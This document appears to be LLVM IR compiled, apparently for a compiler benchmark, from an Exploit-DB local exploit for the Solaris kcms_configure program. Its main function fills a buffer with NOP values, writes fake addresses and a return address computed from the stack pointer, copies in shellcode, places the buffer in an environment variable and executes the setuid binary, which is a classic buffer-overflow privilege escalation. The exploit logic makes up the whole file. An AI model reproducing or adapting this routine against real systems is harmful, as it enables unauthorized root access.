; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19342.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19342.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"LANG=\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"ESP =0x%x\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [11 x i8] c"FAKE=0x%x\0A\00", align 1
@FAKEADR1 = common dso_local global i32 0, align 4
@FAKEADR2 = common dso_local global i32 0, align 4
@RETOFS = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [11 x i8] c"EIP =0x%x\0A\00", align 1
@RETADR = common dso_local global i32 0, align 4
@EXPADR = common dso_local global i32 0, align 4
@exploit_code = common dso_local global i32 0, align 4
@ENV = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [32 x i8] c"/usr/openwin/bin/kcms_configure\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"kcms_configure\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"1\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @MAXBUF, align 4
  %8 = zext i32 %7 to i64
  %9 = call i8* @llvm.stacksave()
  store i8* %9, i8** %2, align 8
  %10 = alloca i8, i64 %8, align 16
  store i64 %8, i64* %3, align 8
  %11 = call i32 @putenv(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 (...) @get_sp()
  store i32 %12, i32* %6, align 4
  %13 = load i32, i32* %6, align 4
  %14 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i32 %13)
  store i32 0, i32* %4, align 4
  br label %15

15:                                               ; preds = %51, %0
  %16 = load i32, i32* %4, align 4
  %17 = load i32, i32* @MAXBUF, align 4
  %18 = sub nsw i32 %17, 4
  %19 = icmp ult i32 %16, %18
  br i1 %19, label %20, label %54

20:                                               ; preds = %15
  %21 = load i32, i32* @NOP, align 4
  %22 = and i32 %21, 255
  %23 = trunc i32 %22 to i8
  %24 = load i32, i32* %4, align 4
  %25 = add i32 %24, 3
  %26 = zext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %10, i64 %26
  store i8 %23, i8* %27, align 1
  %28 = load i32, i32* @NOP, align 4
  %29 = ashr i32 %28, 8
  %30 = and i32 %29, 255
  %31 = trunc i32 %30 to i8
  %32 = load i32, i32* %4, align 4
  %33 = add i32 %32, 2
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %10, i64 %34
  store i8 %31, i8* %35, align 1
  %36 = load i32, i32* @NOP, align 4
  %37 = ashr i32 %36, 16
  %38 = and i32 %37, 255
  %39 = trunc i32 %38 to i8
  %40 = load i32, i32* %4, align 4
  %41 = add i32 %40, 1
  %42 = zext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %10, i64 %42
  store i8 %39, i8* %43, align 1
  %44 = load i32, i32* @NOP, align 4
  %45 = ashr i32 %44, 24
  %46 = and i32 %45, 255
  %47 = trunc i32 %46 to i8
  %48 = load i32, i32* %4, align 4
  %49 = zext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %10, i64 %49
  store i8 %47, i8* %50, align 1
  br label %51

51:                                               ; preds = %20
  %52 = load i32, i32* %4, align 4
  %53 = add i32 %52, 4
  store i32 %53, i32* %4, align 4
  br label %15

54:                                               ; preds = %15
  %55 = load i32, i32* %6, align 4
  store i32 %55, i32* %5, align 4
  %56 = load i32, i32* %6, align 4
  %57 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i32 %56)
  %58 = load i32, i32* %5, align 4
  %59 = and i32 %58, 255
  %60 = trunc i32 %59 to i8
  %61 = load i32, i32* @FAKEADR1, align 4
  %62 = add nsw i32 %61, 3
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %10, i64 %63
  store i8 %60, i8* %64, align 1
  %65 = load i32, i32* %5, align 4
  %66 = lshr i32 %65, 8
  %67 = and i32 %66, 255
  %68 = trunc i32 %67 to i8
  %69 = load i32, i32* @FAKEADR1, align 4
  %70 = add nsw i32 %69, 2
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %10, i64 %71
  store i8 %68, i8* %72, align 1
  %73 = load i32, i32* %5, align 4
  %74 = lshr i32 %73, 16
  %75 = and i32 %74, 255
  %76 = trunc i32 %75 to i8
  %77 = load i32, i32* @FAKEADR1, align 4
  %78 = add nsw i32 %77, 1
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %10, i64 %79
  store i8 %76, i8* %80, align 1
  %81 = load i32, i32* %5, align 4
  %82 = lshr i32 %81, 24
  %83 = and i32 %82, 255
  %84 = trunc i32 %83 to i8
  %85 = load i32, i32* @FAKEADR1, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %10, i64 %86
  store i8 %84, i8* %87, align 1
  %88 = load i32, i32* %5, align 4
  %89 = and i32 %88, 255
  %90 = trunc i32 %89 to i8
  %91 = load i32, i32* @FAKEADR2, align 4
  %92 = add nsw i32 %91, 3
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %10, i64 %93
  store i8 %90, i8* %94, align 1
  %95 = load i32, i32* %5, align 4
  %96 = lshr i32 %95, 8
  %97 = and i32 %96, 255
  %98 = trunc i32 %97 to i8
  %99 = load i32, i32* @FAKEADR2, align 4
  %100 = add nsw i32 %99, 2
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %10, i64 %101
  store i8 %98, i8* %102, align 1
  %103 = load i32, i32* %5, align 4
  %104 = lshr i32 %103, 16
  %105 = and i32 %104, 255
  %106 = trunc i32 %105 to i8
  %107 = load i32, i32* @FAKEADR2, align 4
  %108 = add nsw i32 %107, 1
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %10, i64 %109
  store i8 %106, i8* %110, align 1
  %111 = load i32, i32* %5, align 4
  %112 = lshr i32 %111, 24
  %113 = and i32 %112, 255
  %114 = trunc i32 %113 to i8
  %115 = load i32, i32* @FAKEADR2, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %10, i64 %116
  store i8 %114, i8* %117, align 1
  %118 = load i32, i32* %6, align 4
  %119 = load i32, i32* @RETOFS, align 4
  %120 = sub i32 %118, %119
  store i32 %120, i32* %5, align 4
  %121 = load i32, i32* %6, align 4
  %122 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i32 %121)
  %123 = load i32, i32* %5, align 4
  %124 = and i32 %123, 255
  %125 = trunc i32 %124 to i8
  %126 = load i32, i32* @RETADR, align 4
  %127 = add nsw i32 %126, 3
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %10, i64 %128
  store i8 %125, i8* %129, align 1
  %130 = load i32, i32* %5, align 4
  %131 = lshr i32 %130, 8
  %132 = and i32 %131, 255
  %133 = trunc i32 %132 to i8
  %134 = load i32, i32* @RETADR, align 4
  %135 = add nsw i32 %134, 2
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %10, i64 %136
  store i8 %133, i8* %137, align 1
  %138 = load i32, i32* %5, align 4
  %139 = lshr i32 %138, 16
  %140 = and i32 %139, 255
  %141 = trunc i32 %140 to i8
  %142 = load i32, i32* @RETADR, align 4
  %143 = add nsw i32 %142, 1
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %10, i64 %144
  store i8 %141, i8* %145, align 1
  %146 = load i32, i32* %5, align 4
  %147 = lshr i32 %146, 24
  %148 = and i32 %147, 255
  %149 = trunc i32 %148 to i8
  %150 = load i32, i32* @RETADR, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8, i8* %10, i64 %151
  store i8 %149, i8* %152, align 1
  %153 = load i32, i32* @EXPADR, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %10, i64 %154
  %156 = load i32, i32* @exploit_code, align 4
  %157 = load i32, i32* @exploit_code, align 4
  %158 = call i32 @strlen(i32 %157)
  %159 = call i32 @strncpy(i8* %155, i32 %156, i32 %158)
  %160 = load i32, i32* @ENV, align 4
  %161 = load i32, i32* @ENV, align 4
  %162 = call i32 @strlen(i32 %161)
  %163 = call i32 @strncpy(i8* %10, i32 %160, i32 %162)
  %164 = load i32, i32* @MAXBUF, align 4
  %165 = sub nsw i32 %164, 1
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i8, i8* %10, i64 %166
  store i8 0, i8* %167, align 1
  %168 = call i32 @putenv(i8* %10)
  %169 = call i32 @execl(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0), i32 0)
  %170 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %170)
  %171 = load i32, i32* %1, align 4
  ret i32 %171
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @printf(i8*, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
